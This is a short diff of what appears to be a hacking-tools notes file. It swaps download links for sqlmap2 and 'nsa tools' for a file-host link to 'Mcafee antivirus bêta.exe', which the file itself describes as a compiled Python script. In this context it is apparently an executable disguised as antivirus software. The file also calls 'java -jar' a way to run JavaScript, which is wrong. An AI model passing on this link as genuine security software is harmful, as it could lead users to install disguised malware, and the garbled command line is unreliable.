@@ -9,10 +9,8 @@ run python cmd: py file.py
 run perl: perl file.pl
 install perl modules: cpan install
 
-download sqlmap2 : https://github.com/hacktoolspack/sqlmap2/archive/master.zip
 
-
-download nsa tools : http://download1474.mediafireuserdownload.com/ybrmosnur37g/3n88n0wca9rsgln/5f477243.rar.0c9e0294
+download Mcafee antivirus bêta.exe (script python compiled) : http://download1474.mediafire.com/7v9qb778apqg/geatwts7ba2hlbt/mcafee+antivirus+b%C3%AAta.rar
 
 
 execute javascript : java -jar file.jar
